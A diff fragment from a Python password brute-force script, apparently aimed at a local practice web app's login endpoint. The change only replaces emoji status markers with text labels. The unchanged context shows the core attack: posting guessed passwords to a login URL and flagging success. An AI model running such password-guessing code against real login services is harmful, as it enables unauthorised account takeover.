@@ -13,12 +13,12 @@ def attempt_password(password):
     try:
         response = requests.post("http://localhost:3000/rest/user/login", headers=headers, data=json.dumps(data))
         if response.status_code == 200 and "authentication" in response.text:
-            print(f"\n✅ Password found: {password.strip()}")
+            print(f"\n[SUCCESS] Password found: {password.strip()}")
             return True
         else:
-            print(f"❌ Tried: {password.strip()}")
+            print(f"[-] Tried: {password.strip()}")
     except:
-        print(f"⚠️ Error trying password: {password.strip()}")
+        print(f"[WARNING] Error trying password: {password.strip()}")
     return False
 
 def main():
